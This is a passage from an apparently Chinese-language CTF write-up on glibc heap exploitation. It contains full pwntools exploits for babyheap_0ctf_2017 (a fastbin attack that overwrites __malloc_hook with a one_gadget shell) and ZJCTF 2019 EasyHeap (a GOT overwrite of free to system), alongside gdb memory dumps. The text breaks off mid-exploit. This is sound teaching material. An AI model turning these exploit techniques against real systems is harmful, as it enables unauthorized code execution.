0x0000000000000000</span><br><span class="line">0x7f3009d9eb30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f3009d9eb40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f3009d9eb50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f3009d9eb60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f3009d9eb70 &lt;main_arena+80&gt;:	0x0000000000000000	0x000055ffe588d200</span><br><span class="line">0x7f3009d9eb80 &lt;main_arena+96&gt;:	0x0000000000000000	0x000055ffe588d0c0</span><br><span class="line">0x7f3009d9eb90 &lt;main_arena+112&gt;:	0x000055ffe588d0c0	0x00007f3009d9eb88</span><br><span class="line">0x7f3009d9eba0 &lt;main_arena+128&gt;:	0x00007f3009d9eb88	0x00007f3009d9eb98</span><br><span class="line">0x7f3009d9ebb0 &lt;main_arena+144&gt;:	0x00007f3009d9eb98	0x00007f3009d9eba8</span><br></pre></td></tr></table></figure>

<h3 id="0x5-获取libc-base"><a href="#0x5-获取libc-base" class="headerlink" title="0x5 获取libc base"></a>0x5 获取libc base</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_base&#x3D;u64(p.recv(8))-(0x3c4b20+0x58)</span><br><span class="line">print(&#39;libc_base&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&gt;&#39;,hex(libc_base))</span><br></pre></td></tr></table></figure>

<p>利用工具获取main_arena_offset</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> trick@ubuntu$ .&#x2F;main_arena &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</span><br><span class="line">[+]libc version : glibc 2.23</span><br><span class="line">[+]build ID : BuildID[sha1]&#x3D;c4fd86ec1eed57a09c79ce601f6c6e3796f574df</span><br><span class="line">[+]main_arena_offset : 0x3c4b20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="0x6-Fastbin-Attack"><a href="#0x6-Fastbin-Attack" class="headerlink" title="0x6 Fastbin Attack"></a>0x6 Fastbin Attack</h3><p>leak了libc基地址，接下来通过修改 malloc_hook 为 one_gadget 即可成功 getshell</p>
<p>找到 malloc_hook 地址，寻找满足fastbin 对齐检查的 fake chunk addr ，计算 malloc_hook 距离该 fake chunk addr 的 offset 。溢出 chunk0 修改 chunk1 的 fd 指向该 fake chunk addr 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p (void*)&amp;main_arena</span><br><span class="line">$1 &#x3D; (void *) 0x7f284c2c8b20 &lt;main_arena&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x7f284c2c8b20-0x10</span><br><span class="line">0x7f284c2c8b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f284c2c8b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f284c2c8b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f284c2c8b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f284c2c8b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f284c2c8b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f284c2c8b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005629a87eb200</span><br><span class="line">0x7f284c2c8b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00005629a87eb0c0</span><br><span class="line">0x7f284c2c8b90 &lt;main_arena+112&gt;:	0x00005629a87eb0c0	0x00007f284c2c8b88</span><br><span class="line">0x7f284c2c8ba0 &lt;main_arena+128&gt;:	0x00007f284c2c8b88	0x00007f284c2c8b98</span><br><span class="line"></span><br><span class="line">pwndbg&gt; find_fake_fast 0x7f284c2c8b10 0x7f</span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk</span><br><span class="line">Addr: 0x7f284c2c8aed</span><br><span class="line">prev_size: 0x00</span><br><span class="line">size: 0x284c2c7260000000</span><br><span class="line">fd: 0x284bf89a7000007f</span><br><span class="line">bk: 0x284bf89ea0000000</span><br><span class="line">fd_nextsize: 0x7f</span><br><span class="line">bk_nextsize: 0x7f</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p&#x2F;x 0x7f284c2c8b10-0x7f284c2c8aed</span><br><span class="line">$2 &#x3D; 0x23</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>计算fake chunk addr 距离malloc_hook 的 offset 为0x23</p>
<h3 id="0x7-申请做为fake-chunk的chunk"><a href="#0x7-申请做为fake-chunk的chunk" class="headerlink" title="0x7 申请做为fake chunk的chunk"></a>0x7 申请做为fake chunk的chunk</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;70gx 0x55be040f5000</span><br><span class="line">0x55be040f5000:	0x0000000000000000	0x0000000000000031 0</span><br><span class="line">0x55be040f5010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5030:	0x0000000000000000	0x0000000000000031 1</span><br><span class="line">0x55be040f5040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5060:	0x0000000000000000	0x0000000000000031 2 -&gt; 4</span><br><span class="line">0x55be040f5070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5090:	0x0000000000000000	0x0000000000000031 3</span><br><span class="line">0x55be040f50a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f50b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f50c0:	0x0000000000000000	0x0000000000000071 4</span><br><span class="line">0x55be040f50d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f50e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f50f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5130:	0x0000000000000000	0x00000000000000a1 f</span><br><span class="line">0x55be040f5140:	0x00007f9a2f313b78	0x00007f9a2f313b78</span><br><span class="line">0x55be040f5150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f51a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f51b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f51c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f51d0:	0x00000000000000a0	0x0000000000000030 5</span><br><span class="line">0x55be040f51e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f51f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5200:	0x0000000000000000	0x0000000000020e01</span><br><span class="line">0x55be040f5210:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be040f5220:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">malloc_addr = libc_base + <span class="number">0x3c4b10</span>  <span class="comment">#libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line">fill(<span class="number">2</span>,p64(malloc_addr - <span class="number">0x23</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;80gx 0x5629b14b2000</span><br><span class="line">0x5629b14b2000:	0x0000000000000000	0x0000000000000031 0</span><br><span class="line">0x5629b14b2010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2030:	0x0000000000000000	0x0000000000000031 1</span><br><span class="line">0x5629b14b2040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2060:	0x0000000000000000	0x0000000000000031 2</span><br><span class="line">0x5629b14b2070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2090:	0x0000000000000000	0x0000000000000031 3</span><br><span class="line">0x5629b14b20a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b20b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b20c0:	0x0000000000000000	0x0000000000000071 4f</span><br><span class="line">0x5629b14b20d0:	0x00007ff4541c8aed	0x0000000000000000</span><br><span class="line">0x5629b14b20e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b20f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2130:	0x0000000000000000	0x00000000000000a1 f</span><br><span class="line">0x5629b14b2140:	0x00007ff4541c8b78	0x00007ff4541c8b78</span><br><span class="line">0x5629b14b2150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b21a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b21b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b21c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b21d0:	0x00000000000000a0	0x0000000000000030 5</span><br><span class="line">0x5629b14b21e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b21f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2200:	0x0000000000000000	0x0000000000020e01</span><br><span class="line">0x5629b14b2210:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2220:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2230:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5629b14b2270:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x00007ff4541c8aed</span><br><span class="line">0x7ff4541c8aed &lt;_IO_wide_data_0+301&gt;:	0xf4541c7260000000	0x000000000000007f</span><br><span class="line">0x7ff4541c8afd:	0xf453e89ea0000000	0xf453e89a7000007f</span><br><span class="line">0x7ff4541c8b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7ff4541c8b1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ff4541c8b2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ff4541c8b3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ff4541c8b4d &lt;main_arena+45&gt;:	0x29b14b20c0000000	0x0000000000000056</span><br><span class="line">0x7ff4541c8b5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ff4541c8b6d &lt;main_arena+77&gt;:	0x0000000000000000	0x29b14b2200000000</span><br><span class="line">0x7ff4541c8b7d &lt;main_arena+93&gt;:	0x29b14b2130000056	0x29b14b2130000056</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一次</span><br><span class="line">add(0x60)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x7fd58eacdb10-0x23</span><br><span class="line">0x7fd58eacdaed &lt;_IO_wide_data_0+301&gt;:	0xd58eacc260000000	0x000000000000007f</span><br><span class="line">0x7fd58eacdafd:	0xd58e78eea0000000	0xd58e78ea7000007f</span><br><span class="line">0x7fd58eacdb0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7fd58eacdb1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fd58eacdb2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fd58eacdb3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fd58eacdb4d &lt;main_arena+45&gt;:	0xd58eacdaed000000	0x000000000000007f</span><br><span class="line">0x7fd58eacdb5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fd58eacdb6d &lt;main_arena+77&gt;:	0x0000000000000000	0xc9c19be200000000</span><br><span class="line">0x7fd58eacdb7d &lt;main_arena+93&gt;:	0xc9c19be130000055	0xc9c19be130000055</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第二次</span><br><span class="line">add(0x60)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x7fd58eacdb10-0x23</span><br><span class="line">0x7fd58eacdaed &lt;_IO_wide_data_0+301&gt;:	0xd58eacc260000000	0x000000000000007f</span><br><span class="line">0x7fd58eacdafd:	0xd58e78eea0000000	0xd58e78ea7000007f</span><br><span class="line">0x7fd58eacdb0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7fd58eacdb1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fd58eacdb2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fd58eacdb3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fd58eacdb4d &lt;main_arena+45&gt;:	0xd58eacdaed000000	0x000000000000007f</span><br><span class="line">0x7fd58eacdb5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fd58eacdb6d &lt;main_arena+77&gt;:	0x0000000000000000	0xc9c19be200000000</span><br><span class="line">0x7fd58eacdb7d &lt;main_arena+93&gt;:	0xc9c19be130000055	0xc9c19be130000055</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h3 id="0x8-获取onegadget"><a href="#0x8-获取onegadget" class="headerlink" title="0x8 获取onegadget"></a>0x8 获取onegadget</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trick@ubuntu$ one_gadget &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</span><br><span class="line">0x45216 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] &#x3D;&#x3D; NULL</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fill(6,&#39;a&#39;*3+p64(0)*2+p64(libc_base+0x4526a))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p (void*)&amp;__malloc_hook</span><br><span class="line">$2 &#x3D; (void *) 0x7f4bfbc63b10 &lt;__malloc_hook&gt;</span><br><span class="line">gdb-peda$ x&#x2F;80gx 0x7f4bfbc63b10</span><br><span class="line">0x7f4bfbc63b10 &lt;__malloc_hook&gt;:	0x00007f4bfb8e426a	0x0000000000000000</span><br><span class="line">0x7f4bfbc63b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f4bfbc63b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f4bfbc63b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f4bfbc63b50 &lt;main_arena+48&gt;:	0x4bfb924ea0000000	0x0000000000000000</span><br><span class="line">0x7f4bfbc63b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f4bfbc63b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x000055a668776200</span><br><span class="line">0x7f4bfbc63b80 &lt;main_arena+96&gt;:	0x000055a668776130	0x000055a668776130</span><br></pre></td></tr></table></figure>


<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27300)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content))) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>)+p8(<span class="number">0xc0</span>))</span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">get_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x3c4b20</span> + <span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base=======&gt;&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,p64(malloc_addr - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">fill(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc_base+<span class="number">0x4526a</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><p>保护</p>
<p><img src="/article/Heap_Exploitation/image-20210413141119979.png" alt="image-20210413141119979"></p>
<p>地址随机化没有打开，Partial RELRO 那说明got表可写，可以通过改写got表为想要的函数</p>
<p>IDA</p>
<p>三个主要的函数，create，edit，delete</p>
<ul>
<li><p>create ：</p>
<p><img src="/article/Heap_Exploitation/image-20210413142054405.png" alt="image-20210413142054405"></p>
<p>用 heaparray 数组管理堆块指针。。。。可以利用</p>
</li>
<li><p>edit ：有堆溢出</p>
</li>
<li><p>del 函数 free之后数据会清0，没有uaf漏洞</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="string">&quot;So sad !&quot;</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="string">&quot;Congrt !&quot;</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">l33t</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当在menu中输入4869时，会判断 magic 的值是否大于等于 0x1305， magic 在bss段上，可以通过unsorted bin attack修改 magic 为一个很大的值。</p>
<p>很简单，但却是个坑</p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">咕咕咕</span><br></pre></td></tr></table></figure>



<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li>利用 fastbin attack</li>
<li>找到程序中管理堆块指针的数组 heaparray 改为 free_got</li>
<li>修改 free_got 的指针指向 system 的地址</li>
<li>当一个数据为 ‘/bin/sh’ 的堆去 free 时 -&gt; free(‘/bin/sh’) -&gt; system(‘/bin/sh’)</li>
</ul>
<p>找到 heaparray 上方可以造 fake fastbin 的位置，算出offset</p>
<p><img src="/article/Heap_Exploitation/image-20210413143453006.png" alt="image-20210413143453006"></p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,28495)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="comment">#magic_addr =  0x6020C0</span></span><br><span class="line">heaparray_addr = <span class="number">0x6020e0</span></span><br><span class="line">find_fake_fast = <span class="number">0x6020ad</span></span><br><span class="line">system_addr = <span class="number">0x400C2C</span></span><br><span class="line">offset = <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content of heap:&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content))) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content of heap : &#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0 </span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(find_fake_fast))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(offset-<span class="number">0x10</span>) + p64(free_got)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>)<span 